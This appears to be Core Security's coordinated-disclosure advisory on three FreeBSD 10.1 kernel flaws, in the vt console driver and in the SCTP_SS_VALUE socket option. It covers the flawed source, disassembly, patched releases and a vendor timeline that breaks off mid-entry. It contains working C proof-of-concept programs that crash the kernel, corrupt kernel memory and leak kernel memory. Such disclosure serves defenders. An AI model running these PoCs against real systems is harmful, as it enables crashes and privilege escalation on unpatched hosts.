@@ -1,0 +1,838 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+FreeBSD Kernel Multiple Vulnerabilities
+
+
+
+1. *Advisory Information*
+
+Title: FreeBSD Kernel Multiple Vulnerabilities
+Advisory ID: CORE-2015-0003
+Advisory URL: http://www.coresecurity.com/content/freebsd-kernel-multiple-vulnerabilities
+Date published: 2015-01-27
+Date of last update: 2015-01-27
+Vendors contacted: FreeBSD
+Release mode: Coordinated release
+
+
+
+2. *Vulnerability Information*
+
+Class: Unsigned to Signed Conversion Error [CWE-196], Improper Validation of Array Index [CWE-129], Improper Validation of Array Index [CWE-129]
+Impact: Code execution, Denial of service
+Remotely Exploitable: No
+Locally Exploitable: Yes
+CVE Name: CVE-2014-0998, CVE-2014-8612, CVE-2014-8612
+
+
+
+3. *Vulnerability Description*
+
+
+    FreeBSD is an advanced computer operating system used to power modern servers, desktops and embedded platforms. 
+    A large community has continually developed it for more than thirty years. Its advanced networking, 
+    security and storage features have made FreeBSD the platform of choice for many of the busiest web sites 
+    and most pervasive embedded networking and storage devices.
+   
+
+
+    Multiple vulnerabilities have been found in the FreeBSD kernel code that implements 
+    the vt console driver (previously known as Newcons) and the code that implements SCTP sockets.
+    These vulnerabilities could allow local unprivileged attackers to disclose kernel memory containing 
+    sensitive information, crash the system, and execute arbitrary code with superuser privileges.
+   
+
+
+4. *Vulnerable packages*
+
+   . FreeBSD 10.1-RELEASE.
+   
+Other versions may be affected too but they were no checked.
+
+
+5. *Non-vulnerable packages*
+
+   . FreeBSD 10.1-RELENG.
+
+6. *Vendor Information, Solutions and Workarounds*
+
+
+The FreeBSD team has released patches for the reported vulnerabilities. You should upgrade to FreeBSD 10.1-RELENG or one of the following releases:
+    
+
+   .  stable/10, 10.1-STABLE 
+   .  releng/10.1, 10.1-RELEASE-p5 
+   .  releng/10.0, 10.0-RELEASE-p17 
+   .  stable/9, 9.3-STABLE 
+   .  releng/9.3, 9.3-RELEASE-p9 
+   .  stable/8, 8.4-STABLE 
+   .  releng/8.4, 8.4-RELEASE-p23 
+
+The vendor publish a security Advisory that can be accessed here[6]. 
+
+
+7. *Credits*
+
+This vulnerability was discovered and researched by Francisco Falcon from Core Exploit Writers Team. The publication of this advisory was coordinated by Joaquin Rodriguez Varela from Core Advisories Team. 
+  
+
+
+8. *Technical Description / Proof of Concept Code*
+
+
+8.1. *FreeBSD vt Driver VT_WAITACTIVE Sign Conversion Vulnerability*
+
+[CVE-2014-0998]
+FreeBSD 10.1-RELEASE added[1] the 'vt(4)'[2] console driver (previously known as Newcons[3]). This new console driver can be enabled by adding the line 'kern.vty=vt' to the '/boot/loader.conf' file and then rebooting the system.
+
+The vt console driver is prone to a sign conversion error when handling the 'VT_WAITACTIVE' ioctl message, which can be ultimately leveraged by a local unprivileged attacker to make the kernel access an array outside of its boundaries.
+
+The vt console driver provides multiple virtual terminals, which are mapped to the '/dev/ttyv*' device nodes. A user can send messages to the vt driver by opening the '/dev/ttyv*' device node belonging to his virtual terminal and then using the 'ioctl' system call.
+
+The function 'vtterm_ioctl' in 'sys/dev/vt/vt_core.c' handles ioctl messages sent to the vt driver. One of the supported messages is called 'VT_WAITACTIVE':
+
+
+/-----
+static int
+vtterm_ioctl(struct terminal *tm, u_long cmd, caddr_t data,
+    struct thread *td)
+{
+    int error, i, s;
+    [...]
+    switch (cmd) {
+    [...]
+    case VT_WAITACTIVE:
+        error = 0;
+
+        i = *(unsigned int *)data;
+        if (i > VT_MAXWINDOWS)
+            return (EINVAL);
+        if (i != 0)
+            vw = vd->vd_windows[i - 1];
+    [...]
+     
+-----/
+
+As shown above, when handling the 'VT_WAITACTIVE' ioctl message, the  'data' input buffer (which is fully controlled by the local user) is casted as '(unsigned int *)' in order to read an 'unsigned int' from the input data; however, the read value is stored in the 'i' variable, which has *signed* type 'int'.
+
+This sign conversion error will make possible for a local attacker to bypass the subsequent boundary check that tries to ensure that 'i' is not greater than 'VT_MAXWINDOWS' before using it as an index to access the 'vd->vd_windows' array. This flaw can be leveraged by a local attacker to make the kernel access the 'vd->vd_windows' array outside of its boundaries.
+
+The following disassembly snippet represents the vulnerable code in the FreeBSD kernel binary ('/boot/kernel/kernel'):
+
+
+/-----
+vtterm_ioctl+1306 loc_C09B2506:                                 ; CODE XREF: vtterm_ioctl+D6Cj
+vtterm_ioctl+1306                 cmp     esi, 20047606h        ; case VT_WAITACTIVE:
+vtterm_ioctl+130C                 mov     ecx, edx              ; ecx = vd->vd_windows
+vtterm_ioctl+130E                 mov     eax, ebx
+vtterm_ioctl+1310                 jnz     loc_C09B275B
+vtterm_ioctl+1316                 mov     eax, [eax]            ; i = *(unsigned int *)data;
+vtterm_ioctl+1318                 cmp     eax, 0Ch              ; if (i > VT_MAXWINDOWS)...
+vtterm_ioctl+131B                 mov     edi, 16h          
+vtterm_ioctl+1320                 jg      loc_C09B2760          ; *** signed comparison!
+vtterm_ioctl+1326                 test    eax, eax              ; if (i != 0)...
+vtterm_ioctl+1328                 jz      short loc_C09B2531
+vtterm_ioctl+132A                 mov     eax, [ecx+eax*4-4]    ; **** vw = vd->vd_windows[i - 1]; ---> access vd->vd_windows outside of its boundaries
+vtterm_ioctl+132E                 mov     [ebp+var_30], eax
+     
+-----/
+
+
+8.2. *FreeBSD SCTP Socket SCTP_SS_VALUE Memory Corruption Vulnerability*
+
+[CVE-2014-8612]
+FreeBSD implements the Stream Control Transmission Protocol (SCTP).[4]. A userland application can use the 'getsockopt/setsockopt' system calls in order to manipulate the options associated with an SCTP socket.
+
+The FreeBSD kernel is prone to a memory corruption vulnerability when setting the 'SCTP_SS_VALUE' SCTP socket option via the 'setsockopt' system call. This vulnerability can be leveraged by a local unprivileged attacker to corrupt kernel memory with an arbitrary 16-bit value.
+
+The handling of the 'setsockopt' system call at the SCTP level is performed by the function 'sctp_setopt' [file 'sys/netinet/sctp_userreq.c']:
+
+
+/-----
+static int
+sctp_setopt(struct socket *so, int optname, void *optval, size_t optsize,
+    void *p)
+{
+    [...]
+    switch (optname) {
+        [...]
+        case SCTP_SS_VALUE:
+            {
+                struct sctp_stream_value *av;
+
+                SCTP_CHECK_AND_CAST(av, optval, struct sctp_stream_value, optsize);
+                SCTP_FIND_STCB(inp, stcb, av->assoc_id);
+                if (stcb) {
+                    if (stcb->asoc.ss_functions.sctp_ss_set_value(stcb, &stcb->asoc, &stcb->asoc.strmout[av->stream_id],
+                        av->stream_value) < 0) {
+     
+-----/
+
+As shown above, when handling the 'SCTP_SS_VALUE' socket option, the 'optval' option value (which is fully controlled by the local user), is casted to the 'struct sctp_stream_value *' type and stored into the 'av' variable by using the 'SCTP_CHECK_AND_CAST' macro. After that, if the 'sctb' pointer is not 'NULL' (condition that can be achieved by having the SCTP socket in a *connected* state), then the 'stcb->asoc.ss_functions.sctp_ss_set_value' function pointer is called. The third argument for this function is '&stcb->asoc.strmout[av->stream_id]'. As can be seen, the unstrusted 'av->stream_id' value (which is fully controlled by the local attacker) is used as an index within the 'stcb->asoc.strmout' array without properly checking if it's within the bounds of the array.
+
+However, note that the memory address calculated using the untrusted index is not dereferenced yet; just the calculated address is passed as an argument to the function, so there is still no memory access at this point.
+
+'stcb->asoc.ss_functions' has type 'struct sctp_ss_functions', which is a struct defined in the file 'sys/netinet/sctp_structs.h' containing several function pointers. One of its members is 'sctp_ss_set_value', which is the one being called when handling the 'SCTP_SS_VALUE' socket option:
+
+
+/-----
+/*
+ * RS - Structure to hold function pointers to the functions responsible
+ * for stream scheduling.
+ */
+struct sctp_ss_functions {
+    void (*sctp_ss_init) (struct sctp_tcb *stcb, struct sctp_association *asoc,
+             int holds_lock);
+    void (*sctp_ss_clear) (struct sctp_tcb *stcb, struct sctp_association *asoc,
+             int clear_values, int holds_lock);
+    void (*sctp_ss_init_stream) (struct sctp_stream_out *strq, struct sctp_stream_out *with_strq);
+    void (*sctp_ss_add_to_stream) (struct sctp_tcb *stcb, struct sctp_association *asoc,
+             struct sctp_stream_out *strq, struct sctp_stream_queue_pending *sp, int holds_lock);
+    int (*sctp_ss_is_empty) (struct sctp_tcb *stcb, struct sctp_association *asoc);
+    void (*sctp_ss_remove_from_stream) (struct sctp_tcb *stcb, struct sctp_association *asoc,
+             struct sctp_stream_out *strq, struct sctp_stream_queue_pending *sp, int holds_lock);
+    struct sctp_stream_out *(*sctp_ss_select_stream) (struct sctp_tcb *stcb,
+                        struct sctp_nets *net, struct sctp_association *asoc);
+    void (*sctp_ss_scheduled) (struct sctp_tcb *stcb, struct sctp_nets *net,
+             struct sctp_association *asoc, struct sctp_stream_out *strq, int moved_how_much);
+    void (*sctp_ss_packet_done) (struct sctp_tcb *stcb, struct sctp_nets *net,
+             struct sctp_association *asoc);
+    int (*sctp_ss_get_value) (struct sctp_tcb *stcb, struct sctp_association *asoc,
+            struct sctp_stream_out *strq, uint16_t * value);
+    int (*sctp_ss_set_value) (struct sctp_tcb *stcb, struct sctp_association *asoc,
+            struct sctp_stream_out *strq, uint16_t value);
+};
+     
+-----/
+
+The file 'sys/netinet/sctp_ss_functions.c' defines an array called 'sctp_ss_functions'; each element of this array has type 'struct sctp_ss_functions' and defines a set of function pointers suitable for different SCTP socket options:
+
+
+/-----
+struct sctp_ss_functions sctp_ss_functions[] = {
+/* SCTP_SS_DEFAULT */
+    {
+        .sctp_ss_init = sctp_ss_default_init,
+        .sctp_ss_clear = sctp_ss_default_clear,
+        .sctp_ss_init_stream = sctp_ss_default_init_stream,
+        .sctp_ss_add_to_stream = sctp_ss_default_add,
+        .sctp_ss_is_empty = sctp_ss_default_is_empty,
+        .sctp_ss_remove_from_stream = sctp_ss_default_remove,
+        .sctp_ss_select_stream = sctp_ss_default_select,
+        .sctp_ss_scheduled = sctp_ss_default_scheduled,
+        .sctp_ss_packet_done = sctp_ss_default_packet_done,
+        .sctp_ss_get_value = sctp_ss_default_get_value,
+        .sctp_ss_set_value = sctp_ss_default_set_value
+    },
+/* SCTP_SS_ROUND_ROBIN */
+    {
+        .sctp_ss_init = sctp_ss_default_init,
+        .sctp_ss_clear = sctp_ss_default_clear,
+        .sctp_ss_init_stream = sctp_ss_default_init_stream,
+        .sctp_ss_add_to_stream = sctp_ss_rr_add,
+        .sctp_ss_is_empty = sctp_ss_default_is_empty,
+        .sctp_ss_remove_from_stream = sctp_ss_default_remove,
+        .sctp_ss_select_stream = sctp_ss_default_select,
+        .sctp_ss_scheduled = sctp_ss_default_scheduled,
+        .sctp_ss_packet_done = sctp_ss_default_packet_done,
+        .sctp_ss_get_value = sctp_ss_default_get_value,
+        .sctp_ss_set_value = sctp_ss_default_set_value
+    },
+/* SCTP_SS_ROUND_ROBIN_PACKET */
+    {
+        .sctp_ss_init = sctp_ss_default_init,
+        .sctp_ss_clear = sctp_ss_default_clear,
+        .sctp_ss_init_stream = sctp_ss_default_init_stream,
+        .sctp_ss_add_to_stream = sctp_ss_rr_add,
+        .sctp_ss_is_empty = sctp_ss_default_is_empty,
+        .sctp_ss_remove_from_stream = sctp_ss_default_remove,
+        .sctp_ss_select_stream = sctp_ss_rrp_select,
+        .sctp_ss_scheduled = sctp_ss_default_scheduled,
+        .sctp_ss_packet_done = sctp_ss_rrp_packet_done,
+        .sctp_ss_get_value = sctp_ss_default_get_value,
+        .sctp_ss_set_value = sctp_ss_default_set_value
+    },
+/* SCTP_SS_PRIORITY */
+    {
+        .sctp_ss_init = sctp_ss_default_init,
+        .sctp_ss_clear = sctp_ss_prio_clear,
+        .sctp_ss_init_stream = sctp_ss_prio_init_stream,
+        .sctp_ss_add_to_stream = sctp_ss_prio_add,
+        .sctp_ss_is_empty = sctp_ss_default_is_empty,
+        .sctp_ss_remove_from_stream = sctp_ss_prio_remove,
+        .sctp_ss_select_stream = sctp_ss_prio_select,
+        .sctp_ss_scheduled = sctp_ss_default_scheduled,
+        .sctp_ss_packet_done = sctp_ss_default_packet_done,
+        .sctp_ss_get_value = sctp_ss_prio_get_value,
+        .sctp_ss_set_value = sctp_ss_prio_set_value
+    },
+/* SCTP_SS_FAIR_BANDWITH */
+    {
+        .sctp_ss_init = sctp_ss_default_init,
+        .sctp_ss_clear = sctp_ss_fb_clear,
+        .sctp_ss_init_stream = sctp_ss_fb_init_stream,
+        .sctp_ss_add_to_stream = sctp_ss_fb_add,
+        .sctp_ss_is_empty = sctp_ss_default_is_empty,
+        .sctp_ss_remove_from_stream = sctp_ss_fb_remove,
+        .sctp_ss_select_stream = sctp_ss_fb_select,
+        .sctp_ss_scheduled = sctp_ss_fb_scheduled,
+        .sctp_ss_packet_done = sctp_ss_default_packet_done,
+        .sctp_ss_get_value = sctp_ss_default_get_value,
+        .sctp_ss_set_value = sctp_ss_default_set_value
+    },
+/* SCTP_SS_FIRST_COME */
+    {
+        .sctp_ss_init = sctp_ss_fcfs_init,
+        .sctp_ss_clear = sctp_ss_fcfs_clear,
+        .sctp_ss_init_stream = sctp_ss_fcfs_init_stream,
+        .sctp_ss_add_to_stream = sctp_ss_fcfs_add,
+        .sctp_ss_is_empty = sctp_ss_fcfs_is_empty,
+        .sctp_ss_remove_from_stream = sctp_ss_fcfs_remove,
+        .sctp_ss_select_stream = sctp_ss_fcfs_select,
+        .sctp_ss_scheduled = sctp_ss_default_scheduled,
+        .sctp_ss_packet_done = sctp_ss_default_packet_done,
+        .sctp_ss_get_value = sctp_ss_default_get_value,
+        .sctp_ss_set_value = sctp_ss_default_set_value
+    }
+};
+
+     
+-----/
+
+Note that the value for the 'sctp_ss_set_value' field is *almost* always set to 'sctp_ss_default_set_value', which is just a dummy function defined in 'sys/netinet/sctp_ss_functions.c':
+
+
+/-----
+static int
+sctp_ss_default_set_value(struct sctp_tcb *stcb SCTP_UNUSED, struct sctp_association *asoc SCTP_UNUSED,
+    struct sctp_stream_out *strq SCTP_UNUSED, uint16_t value SCTP_UNUSED)
+{
+    /* Nothing to be done here */
+    return (-1);
+}
+     
+-----/
+
+The only case in which the 'sctp_ss_set_value' field is set to a different value is in the 4th element of the array, which corresponds to the 'SCTP_SS_PRIORITY' socket option; in that case, the function pointer is set to 'sctp_ss_prio_set_value', which is a function defined in 'sys/netinet/sctp_ss_functions.c':
+
+
+/-----
+static int
+sctp_ss_prio_set_value(struct sctp_tcb *stcb, struct sctp_association *asoc,
+    struct sctp_stream_out *strq, uint16_t value)
+{
+    if (strq == NULL) {
+        return (-1);
+    }
+    strq->ss_params.prio.priority = value;
+    sctp_ss_prio_remove(stcb, asoc, strq, NULL, 1);
+    sctp_ss_prio_add(stcb, asoc, strq, NULL, 1);
+    return (1);
+}
+     
+-----/
+
+The 'value' parameter is fully controlled by the attacker, and the actual value of the 'strq' pointer parameter is the address '&stcb->asoc.strmout[av->stream_id]' in which the attacker can set the 'av->stream_id' index beyond the boundaries of the array, so this function will provide a write-what-where memory corruption primitive when doing the 'strq->ss_params.prio.priority = value' assignment. This memory corruption vulnerability allows a local unprivileged attacker to overwrite kernel memory outside of the 'stcb->asoc.strmout' array with an arbitrary 'uint16_t' value.
+
+In order to make use of the 'sctp_ss_prio_set_value' function, the attacker needs to set up the 'stcb->asoc.ss_functions' struct with the function pointers belonging to the 'SCTP_SS_PRIORITY' socket option. This can be done by hitting the following code in the 'sctp_setopt' function; as can be seen, the 'stcb->asoc.ss_functions' struct can be properly set up for the attack by setting an 'SCTP_PLUGGABLE_SS' socket option with an option value of type 'struct sctp_assoc_value' having its 'assoc_value' field set to 'SCTP_SS_PRIORITY' (see the 'stcb->asoc.ss_functions = sctp_ss_functions[av->assoc_value] ' statement):
+
+
+/-----
+    case SCTP_PLUGGABLE_SS:
+        {
+            struct sctp_assoc_value *av;
+
+            SCTP_CHECK_AND_CAST(av, optval, struct sctp_assoc_value, optsize);
+            /* Checks if av->assoc_value is a valid index within the sctp_ss_functions array */
+            if ((av->assoc_value != SCTP_SS_DEFAULT) &&
+                (av->assoc_value != SCTP_SS_ROUND_ROBIN) &&
+                (av->assoc_value != SCTP_SS_ROUND_ROBIN_PACKET) &&
+                (av->assoc_value != SCTP_SS_PRIORITY) &&
+                (av->assoc_value != SCTP_SS_FAIR_BANDWITH) &&
+                (av->assoc_value != SCTP_SS_FIRST_COME)) {
+                SCTP_LTRACE_ERR_RET(inp, NULL, NULL, SCTP_FROM_SCTP_USRREQ, EINVAL);
+                error = EINVAL;
+                break;
+            }
+            SCTP_FIND_STCB(inp, stcb, av->assoc_id);
+            if (stcb) {
+                stcb->asoc.ss_functions.sctp_ss_clear(stcb, &stcb->asoc, 1, 1);
+                /* The function pointers struct is set up here!!! */
+                stcb->asoc.ss_functions = sctp_ss_functions[av->assoc_value];
+                stcb->asoc.stream_scheduling_module = av->assoc_value;
+                stcb->asoc.ss_functions.sctp_ss_init(stcb, &stcb->asoc, 1);
+                SCTP_TCB_UNLOCK(stcb);
+     
+-----/
+
+
+8.3. *FreeBSD SCTP Socket SCTP_SS_VALUE Kernel Memory Disclosure Vulnerability*
+
+[CVE-2014-8612]
+The third vulnerability is closely related to the second one. The FreeBSD kernel is prone to a kernel memory disclosure when reading the value of the 'SCTP_SS_VALUE' SCTP socket option via the 'getsockopt' system call, which allows local unprivileged attackers to read 16-bit values belonging to the kernel memory space.
+
+The handling of the 'getsockopt' system call at the SCTP level is performed by the function 'sctp_getopt' [file 'sys/netinet/sctp_userreq.c']:
+    
+
+/-----
+static int
+sctp_getopt(struct socket *so, int optname, void *optval, size_t *optsize,
+    void *p)
+{
+    [...]
+    switch (optname) {
+    [...]
+    case SCTP_SS_VALUE:
+        {
+            struct sctp_stream_value *av;
+
+            SCTP_CHECK_AND_CAST(av, optval, struct sctp_stream_value, *optsize);
+            SCTP_FIND_STCB(inp, stcb, av->assoc_id);
+            if (stcb) {
+                if (stcb->asoc.ss_functions.sctp_ss_get_value(stcb, &stcb->asoc, &stcb->asoc.strmout[av->stream_id],
+                    &av->stream_value) < 0) {
+     
+-----/
+
+When handling the 'SCTP_SS_VALUE' socket option, the 'optval' option value (which is fully controlled by the local attacker), is casted to the 'struct sctp_stream_value *' type and stored into the 'av' variable by using the 'SCTP_CHECK_AND_CAST' macro. After that, if the 'sctb' pointer is not 'NULL' (condition that can be achieved by having the SCTP socket in a *connected* state), the 'stcb->asoc.ss_functions.sctp_ss_get_value' function pointer is called. The third argument for this function is '&stcb->asoc.strmout[av->stream_id]'. As can be seen, the unstrusted 'av->stream_id' value (which is fully controlled by the local attacker) is used as an index within the 'stcb->asoc.strmout' array without properly checking if it's within the bounds of the array.
+
+The default value for the 'sctp_ss_get_value' function pointer is 'sctp_ss_default_get_value', which is just a dummy function defined in 'sys/netinet/sctp_ss_functions.c':
+
+
+/-----
+static int
+sctp_ss_default_get_value(struct sctp_tcb *stcb SCTP_UNUSED, struct sctp_association *asoc SCTP_UNUSED,
+    struct sctp_stream_out *strq SCTP_UNUSED, uint16_t * value SCTP_UNUSED)
+{
+    /* Nothing to be done here */
+    return (-1);
+}
+     
+-----/
+
+The only useful possible value for this function pointer is 'sctp_ss_prio_get_value', which belongs to the function pointers of the 'SCTP_SS_PRIORITY' socket option: 
+
+    
+/-----
+static int
+sctp_ss_prio_get_value(struct sctp_tcb *stcb SCTP_UNUSED, struct sctp_association *asoc SCTP_UNUSED,
+    struct sctp_stream_out *strq, uint16_t * value)
+{
+    if (strq == NULL) {
+        return (-1);
+    }
+    *value = strq->ss_params.prio.priority;
+    return (1);
+}
+     
+-----/
+
+The actual value of the 'strq' pointer parameter is the address '&stcb->asoc.strmout[av->stream_id]' in which the attacker can set the 'av->stream_id' index beyond the boundaries of the array, so this function will allow a local unprivileged attacker to read an 'uint16_t' value belonging to the kernel memory outside of the 'stcb->asoc.strmout' array when doing the '*value = strq->ss_params.prio.priority' assignment. 
+    
+In order to make use of the 'sctp_ss_prio_get_value' function, the attacker needs to set up the 'stcb->asoc.ss_functions' struct with the function pointers belonging to the 'SCTP_SS_PRIORITY' socket option, as it was previously explained for the second vulnerability.
+
+
+8.4. *Proof of Concept*
+
+The following code is a Proof of Concept for the first vulnerability:
+
+
+/-----
+#include <stdio.h>
+#include <sys/consio.h>
+#include <sys/ioctl.h>
+#include <fcntl.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc, char **argv){
+    int fd;
+
+    printf("** FreeBSD vt Driver VT_WAITACTIVE Sign Conversion Vulnerability PoC **\n");
+
+    if (argc < 2){
+        printf("\nUsage: ./poc_vt </dev/ttyv*>, where ttyv* is your current virtual terminal.\n");
+        printf("\nExample: ./poc_vt /dev/ttyv1\n\n");
+        exit(1);
+    }
+
+    fd = open(argv[1], O_RDONLY);
+    if (fd == -1){
+        perror("open");
+        exit(1);
+    }
+
+    /* 0x90919293 is a negative number when it's interpreted as a signed int, thus it will bypass the 
+     * (signed) boundary check that tries to guarantee that this value is not greater than VT_MAXWINDOWS (12).
+     * This value will be ultimately used as an index to access the vd->vd_windows array.
+     */
+    if (ioctl(fd, VT_WAITACTIVE, (void *) 0x90919293) == -1){
+        perror("ioctl");
+    }
+
+    close(fd);
+    return 0;
+}
+
+     
+-----/
+
+The following code is a Proof of Concept for the second vulnerability:
+
+
+/-----
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/sctp.h>
+#include <netinet/sctp_uio.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define PORT 4444
+#define ADDR "127.0.0.1"
+
+int main(int argc, char *argv[]) {
+    int fd;
+    struct sockaddr_in addr;
+    struct sctp_initmsg init;
+    struct sctp_stream_value stream_value;
+    struct sctp_assoc_value assoc_value;
+    socklen_t opt_len;
+
+    printf("** FreeBSD SCTP Socket SCTP_SS_VALUE Memory Corruption Vulnerability PoC **\n");
+
+    if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP)) < 0) {
+        perror("socket");
+        goto out;
+    }
+    memset(&init, 0, sizeof(init));
+    init.sinit_num_ostreams = 2048;
+    if (setsockopt(fd, IPPROTO_SCTP, SCTP_INITMSG, &init, (socklen_t)sizeof(struct sctp_initmsg)) < 0) {
+        perror("SCTP_INITMSG");
+        goto out;
+    }
+
+    memset(&addr, 0, sizeof(addr));
+    #ifdef HAVE_SIN_LEN
+    addr.sin_len = sizeof(struct sockaddr_in);
+    #endif
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(PORT);
+    addr.sin_addr.s_addr = inet_addr(ADDR);
+    if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) < 0) {
+        perror("connect");
+        goto out;
+    }
+
+    /* Set up the stcb->asoc.ss_functions struct with the function pointers belonging to the SCTP_SS_PRIORITY socket option */
+    memset(&assoc_value, 0, sizeof(assoc_value));
+    assoc_value.assoc_value = SCTP_SS_PRIORITY;
+    assoc_value.assoc_id = SCTP_CURRENT_ASSOC;
+    if (setsockopt(fd, IPPROTO_SCTP, SCTP_PLUGGABLE_SS, &assoc_value, (socklen_t)sizeof(struct sctp_assoc_value)) < 0){
+        perror("setting up function pointers");
+        goto out;
+    }
+
+    memset(&stream_value, 0, sizeof(stream_value));
+    stream_value.assoc_id = SCTP_CURRENT_ASSOC;
+    /* 
+     * stream_id will be used as an index into the stcb->asoc.strmout array without performing bounds checking.
+     * stream_value will be written to the calculated address.
+     */
+    stream_value.stream_id = 0xFFFF;
+    stream_value.stream_value = 0x4142;
+    /* Triggering the vulnerability... */
+    if (setsockopt(fd, IPPROTO_SCTP, SCTP_SS_VALUE, &stream_value, (socklen_t)sizeof(struct sctp_stream_value)) < 0){
+        perror("triggering the vulnerability");
+        goto out;
+    }
+
+out:
+    if (close(fd) < 0) {
+        perror("close");
+    }
+    return(0);
+}
+
+     
+-----/
+
+The following code is a Proof of Concept for the third vulnerability:
+
+
+/-----
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/sctp.h>
+#include <netinet/sctp_uio.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define PORT 4444
+#define ADDR "127.0.0.1"
+
+int main(int argc, char *argv[]) {
+    int fd;
+    struct sockaddr_in addr;
+    struct sctp_initmsg init;
+    struct sctp_stream_value stream_value;
+    struct sctp_assoc_value assoc_value;
+    socklen_t opt_len;
+
+    printf("** FreeBSD SCTP Socket SCTP_SS_VALUE Kernel Memory Disclosure Vulnerability **\n");
+
+    if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP)) < 0) {
+        perror("socket");
+        goto out;
+    }
+    memset(&init, 0, sizeof(init));
+    init.sinit_num_ostreams = 2048;
+    if (setsockopt(fd, IPPROTO_SCTP, SCTP_INITMSG, &init, (socklen_t)sizeof(struct sctp_initmsg)) < 0) {
+        perror("SCTP_INITMSG");
+        goto out;
+    }
+
+    memset(&addr, 0, sizeof(addr));
+    #ifdef HAVE_SIN_LEN
+    addr.sin_len = sizeof(struct sockaddr_in);
+    #endif
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(PORT);
+    addr.sin_addr.s_addr = inet_addr(ADDR);
+    if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) < 0) {
+        perror("connect");
+        goto out;
+    }
+
+    /* Set up the stcb->asoc.ss_functions struct with the function pointers belonging to the SCTP_SS_PRIORITY socket option */
+    memset(&assoc_value, 0, sizeof(assoc_value));
+    assoc_value.assoc_value = SCTP_SS_PRIORITY;
+    assoc_value.assoc_id = SCTP_CURRENT_ASSOC;
+    if (setsockopt(fd, IPPROTO_SCTP, SCTP_PLUGGABLE_SS, &assoc_value, (socklen_t)sizeof(struct sctp_assoc_value)) < 0){
+        perror("setting up function pointers");
+        goto out;
+    }
+
+    memset(&stream_value, 0, sizeof(stream_value));
+    opt_len = sizeof(stream_value);
+    stream_value.assoc_id = SCTP_CURRENT_ASSOC;
+    /* stream_id will be used as an index into the stcb->asoc.strmout array without performing bounds checking. */
+    stream_value.stream_id = 0x400;
+    /* Triggering the vulnerability... */
+    if (getsockopt(fd, IPPROTO_SCTP, SCTP_SS_VALUE, &stream_value, &opt_len) < 0){
+        perror("triggering the vulnerability");
+        goto out;
+    }
+
+    printf("[*] Value leaked from kernel: 0x%04X\n", stream_value.stream_value);
+
+out:
+    if (close(fd) < 0) {
+        perror("close");
+    }
+    return(0);
+}
+
+     
+-----/
+
+Note that both the second and third PoCs try to connect to a dummy SCTP server listening on localhost on port 4444, since the SCTP socket needs to be in a 'connected' state in order to trigger the vulnerabilities. The following code, based on the example code published here[5], can be used to run a simple SCTP server listening on port 4444:
+
+
+/-----
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/sctp.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#define BUFFER_SIZE (1<<16)
+#define PORT 4444
+#define ADDR "127.0.0.1"
+
+    int main(int argc, char *argv[]) {
+        int fd, n, flags;
+        struct sockaddr_in addr;
+        socklen_t from_len;
+        struct sctp_sndrcvinfo sinfo;
+        char buffer[BUFFER_SIZE];
+        struct sctp_event_subscribe event;
+    
+        if ((fd = socket(AF_INET, SOCK_SEQPACKET, IPPROTO_SCTP)) < 0) {
+            perror("socket");
+            goto out;
+        }
+
+        memset(&event, 1, sizeof(struct sctp_event_subscribe));
+        if (setsockopt(fd, IPPROTO_SCTP, SCTP_EVENTS, &event, sizeof(struct sctp_event_subscribe)) < 0) {
+            perror("setsockopt");
+            goto out;
+        }
+
+        memset(&addr, 0, sizeof(struct sockaddr_in));
+        #ifdef HAVE_SIN_LEN
+        addr.sin_len = sizeof(struct sockaddr_in);
+        #endif
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(PORT);
+        addr.sin_addr.s_addr = inet_addr(ADDR);
+        if (bind(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) < 0) {
+            perror("bind");
+            goto out;
+        }
+
+        if (listen(fd, 1) < 0) {
+            perror("listen");
+            goto out;
+        }
+
+        while (1) {
+            flags = 0;
+            memset(&addr, 0, sizeof(struct sockaddr_in));
+            from_len = (socklen_t)sizeof(struct sockaddr_in);
+            memset(&sinfo, 0, sizeof(struct sctp_sndrcvinfo));
+            n = sctp_recvmsg(fd, (void *)buffer, BUFFER_SIZE, (struct sockaddr *)&addr, &from_len, &sinfo, &flags);
+            if (flags & MSG_NOTIFICATION) {
+                printf("Notification received.\n");
+            } else {
+            printf("Msg of length %d received from %s:%u on stream %d, PPID %d.\n", n, inet_ntoa(addr.sin_addr), ntohs(addr.sin_port),sinfo.sinfo_stream, ntohl(sinfo.sinfo_ppid));
+            }
+        }
+
+out:
+        if (close(fd) < 0) {
+            perror("close");
+        }
+        return (0);
+    }
+     
+-----/
+
+
+9. *Report Timeline*
+
+. 2015-01-15:
+
+Initial notification sent to FreeBSD. Publication date set to Feb 16, 2015.
+        
+
+. 2015-01-15:
+
+FreeBSD confirms reception of the report and requests the draft version of the advisory. They clarify that they usually aim for Tuesday releases depending on the severity of the problem.
+        
+
+. 2015-01-15:
+Core Security sends a draft version of the advisory to the vendor and requests to be informed once they finish reviewing the vulnerabilities.
+        
+
+. 2015-01-26:
+Core Security requests a status report regarding their review of the vulnerabilities and the estimated publication date.
+        
+
+. 2015-01-26:
+
+FreeBSD confirms the bugs, but informs us that they'll only publish a security advisory for the SCTP Socket SCTP_SS_VALUE Memory Corruption and Kernel Memory Disclosure vulnerabilities. For the "vt Driver VT_WAITACTIVE Sign Conversion Vulnerability" they will commit a normal change and then release an "Errata Notice" informing the fix. They set the publication date for 27th January, 2015. 
+        
+
+. 2015-01-26:
